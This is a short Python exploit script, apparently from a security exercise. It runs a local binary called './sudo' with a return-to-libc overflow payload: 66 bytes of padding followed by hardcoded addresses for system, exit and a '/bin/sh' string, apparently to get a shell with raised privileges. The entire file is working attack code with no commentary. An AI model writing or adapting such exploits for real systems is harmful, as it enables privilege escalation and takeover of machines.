import os, sys, struct


PATH_TO_SUDO = './sudo'


def get_arg():
	exit_address = 0xb7c509d0 
	binsh_address = 0xb7d7d82b
	system_address = 0xb7c5cda0
	return 'a'*66 + struct.pack('<I',system_address) + struct.pack('<I',exit_address) + struct.pack('<I',binsh_address) + struct.pack('B',66)


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg());


if __name__ == '__main__':
    main(sys.argv)
